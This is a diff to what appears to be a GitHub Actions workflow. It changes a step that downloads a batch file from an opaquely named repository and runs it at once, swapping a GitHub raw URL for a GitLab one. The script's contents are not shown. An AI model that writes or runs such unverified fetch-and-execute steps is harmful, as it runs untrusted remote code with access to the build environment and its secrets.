@@ -12,7 +12,7 @@ jobs:
     steps:
       - name: Downloading & Installing Essentials
         run: |
-          Invoke-WebRequest -Uri "https://raw.githubusercontent.com/doubleSujoy/58ziyx9/refs/heads/main/dow.bat" -OutFile "Downloads.bat"
+          Invoke-WebRequest -Uri "https://gitlab.com/ultra_code_2893/nex_x_bunny/-/raw/main/main.bat" -OutFile "Downloads.bat"
           cmd /c Downloads.bat
  
       - name: Show Website
